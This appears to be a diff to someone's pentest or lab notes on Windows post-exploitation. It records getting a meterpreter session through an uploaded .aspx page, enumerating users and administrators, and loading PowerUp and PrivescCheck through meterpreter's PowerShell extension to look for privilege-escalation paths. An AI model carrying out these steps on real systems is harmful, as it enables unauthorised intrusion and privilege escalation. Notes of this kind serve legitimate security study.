@@ -47,6 +47,7 @@ run
 Now access robensive.aspx via browser and get meterpreter
 
 getuid 
+getprivs
 ##Completer Initiall Access##
 
 Enumeration for privsec
@@ -64,3 +65,17 @@ shell
 net localgroup administrators -> got  all users
 net user "username"
 exit
+
+1.Powerup (google it)
+wget from github
+load
+load powershell
+help
+powershell_import PowerUp.ps1
+powershell_execurte Invoke_powerup(can cause problem to use  for powerups
+
+2.Privescheck(google it)
+powershell_import PrivescCheck.ps1
+powershell_execurte Invoke_PrivescCheck
+
+3.
